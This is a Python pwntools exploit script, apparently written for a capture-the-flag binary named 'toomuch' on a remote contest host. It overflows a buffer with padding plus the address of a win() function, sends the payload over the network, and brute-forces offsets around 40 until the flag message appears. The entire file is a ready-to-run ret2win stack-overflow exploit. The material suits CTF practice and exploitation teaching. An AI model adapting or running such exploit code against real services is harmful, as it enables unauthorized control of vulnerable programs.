# exploit.py
from pwn import *
import sys

# Configuration
REMOTE_HOST = 'host3.metaproblems.com'
REMOTE_PORT = 7080

# Binary Analysis (local)
# Ensure you have the local binary to extract symbols
# If not available, manually set the win() address
LOCAL_BINARY = './toomuch'

# Load the ELF binary
elf = ELF(LOCAL_BINARY)

# Address of the win() function
win_addr = elf.symbols['win']

# Offset determined from analysis
offset = 40  # Replace with the actual offset if different

# Payload construction
payload = b'A' * offset
payload += p64(win_addr)

# Function to send payload and check for success
def send_payload(host, port, payload):
    try:
        # Connect to the remote service
        io = remote(host, port)

        # Receive the initial prompts
        io.recvuntil(b"Buffer: ")

        # Send the payload
        io.sendline(payload)

        # Receive the response
        response = io.recvall(timeout=2)

        # Check for the success message
        if b"*** Winner Winner Chicken Dinner! ***" in response:
            print("[+] Exploit successful!")
            print("[+] Flag:")
            print(response.decode(errors='ignore'))
            return True
        else:
            print("[-] Exploit failed with the current payload.")
            return False

    except Exception as e:
        print(f"[-] An error occurred: {e}")
        return False

# Main Exploit Logic
def main():
    # First, attempt with the known offset and win() address
    print("[*] Attempting exploit with known offset and win() address...")
    success = send_payload(REMOTE_HOST, REMOTE_PORT, payload)
    if success:
        sys.exit(0)

    # If the above fails, iterate through a range of offsets
    print("[*] Attempting to brute-force the offset...")

    # Define a range around the known offset
    min_offset = offset - 10 if offset >= 10 else 0
    max_offset = offset + 10

    for current_offset in range(min_offset, max_offset + 1):
        if current_offset == offset:
            continue  # Already tried

        # Craft a new payload with the current offset
        trial_payload = b'A' * current_offset
        trial_payload += p64(win_addr)

        print(f"[*] Trying offset: {current_offset}")

        # Send the trial payload
        success = send_payload(REMOTE_HOST, REMOTE_PORT, trial_payload)
        if success:
            print(f"[+] Successfully exploited with offset: {current_offset}")
            print("[+] Flag retrieved.")
            break
        else:
            print(f"[-] Offset {current_offset} did not work.")

    else:
        print("[-] Exploit failed: No successful offset found in the specified range.")

if __name__ == "__main__":
    main()